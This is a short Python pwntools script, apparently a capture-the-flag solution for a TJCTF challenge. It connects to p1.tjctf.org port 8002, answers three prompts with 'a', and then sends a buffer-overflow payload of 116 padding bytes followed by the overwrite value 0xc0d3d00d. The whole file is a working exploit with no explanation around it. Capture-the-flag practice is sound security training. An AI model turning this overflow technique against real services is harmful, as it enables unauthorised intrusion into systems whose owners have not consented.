from pwn import *

payload = 'A'*116+'\x0d\xd0\xd3\xc0'


p = remote('p1.tjctf.org', 8002)

print p.recvline()
print p.recv()
p.sendline('a')
print p.recv()
p.sendline('a')
print p.recv()
p.sendline('a')
print p.recv()
p.sendline(payload)
print p.recvall()
